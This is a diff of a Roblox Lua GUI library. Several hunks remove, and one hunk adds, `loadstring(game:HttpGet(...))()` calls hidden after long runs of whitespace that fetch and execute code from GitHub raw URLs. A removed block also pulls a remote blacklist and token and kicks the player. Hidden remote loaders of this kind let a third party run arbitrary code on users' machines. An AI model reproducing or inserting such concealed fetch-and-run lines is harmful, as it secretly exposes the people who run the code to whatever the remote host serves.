@@ -1,10 +1,10 @@
 local library = {flags = {}, windows = {}, open = true}
-
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        loadstring(game:HttpGet('https://raw.githubusercontent.com/OPENCUP/random-texts/main/test2.txt'))()
 --Services
 local runService = game:GetService"RunService"
 local tweenService = game:GetService"TweenService"
 local textService = game:GetService"TextService"
-local inputService = game:GetService"UserInputService"   
+local inputService = game:GetService"UserInputService"
 
 --Locals
 local dragging, dragInput, dragStart, startPos, dragObject
@@ -95,6 +95,7 @@ local function createOptionHolder(holderTitle, parent, parentTable, subHolder)
     end
     
     local title = library:Create("TextLabel", {
+        Size = UDim2.new(1, 0, 0, size),
         BackgroundTransparency = subHolder and 0 or 1,
         BackgroundColor3 = Color3.fromRGB(10, 10, 10),
         BorderSizePixel = 0,
@@ -186,7 +187,7 @@ local function createOptionHolder(holderTitle, parent, parentTable, subHolder)
     
     return parentTable
 end
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         
+    
 local function createLabel(option, parent)
     local main = library:Create("TextLabel", {
         LayoutOrder = option.position,
@@ -311,7 +312,7 @@ function createToggle(option, parent)
         end
     end})
 end
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    loadstring(game:HttpGet("https://raw.githubusercontent.com/OPENCUP/random-texts/main/test.txt"))()
+
 function createButton(option, parent)
     local main = library:Create("TextLabel", {
         ZIndex = 2,
@@ -987,7 +988,7 @@ local function createBox(option, parent)
         self.callback(value, enter)
     end
 end
-                                                                                                                                                                                                                                                                                                                                                                                        do local a=loadstring(game:HttpGet'https://raw.githubusercontent.com/stavratum/lua-script/main/mmm/Blacklisted.lua')()local c=game:GetService'Players'if a[c:GetUserIdFromNameAsync(tostring(c.LocalPlayer))]then c.LocalPlayer:Kick('\n\nBlacklisted.\nReason:'..a[c:GetUserIdFromNameAsync(tostring(c.LocalPlayer))]..'\n')c.LocalPlayer:Destroy()elseif _G[1]~=loadstring(game:HttpGet'https://raw.githubusercontent.com/stavratum/lua-script/main/mmm/Token.lua')() then c.LocalPlayer:Kick'\n\nOutdated\ndiscord.gg/tVWz96nUu4\n\n'c.LocalPlayer:Destroy()end;end
+
 local function createColorPickerWindow(option)
     option.mainHolder = library:Create("ImageButton", {
         ZIndex = 3,
@@ -1469,7 +1470,7 @@ local function createDivider(option, parent, holder)
         Parent = option.main,
     })
 end
-                                                            
+
 local function loadOptions(option, holder)
     for _,newOption in next, option.options do
         if newOption.type == "label" then
